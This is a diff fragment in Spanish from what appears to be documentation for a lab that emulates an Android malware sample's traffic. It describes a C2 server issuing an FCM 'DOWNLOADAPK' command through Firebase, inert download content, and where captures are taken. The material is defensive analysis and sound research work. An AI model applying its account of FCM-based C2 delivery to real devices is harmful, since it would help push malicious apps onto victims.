-El cliente emulado inicia `firstDownloadStarted` para incluir el aviso opcional de finalización. Es un estado controlado del laboratorio: en la muestra, esa bandera procede de la ruta inicial basada en [`readdeviceVerificationStatus`]{.content-visible unless-format="pdf"}[`\nolinkurl{readdeviceVerificationStatus}`{=latex}]{.content-visible when-format="pdf"}, no de la orden FCM `DOWNLOADAPK`. La captura combina ambas ramas con esta condición explícita y no representa una instalación real. El servidor de descarga entrega contenido inerte y la ruta de `PackageInstaller`, al ser local y estar separada, queda fuera del tráfico generado.
-
-
-La captura se realiza en los puntos definidos por la topología: la entidad víctima y el tramo del C2 hacia Firebase. De este modo se conserva tanto la secuencia recibida por la muestra como la publicación del panel que la desencadena.
-
+La API FCM del laboratorio funciona sobre HTTP/1.1 protegido mediante TLS y el canal de entrega usa un protocolo de líneas sintético. Ambos conservan la causalidad y el contenido lógico necesarios para el análisis, pero no reproducen el protocolo interno completo de Google Play Services.
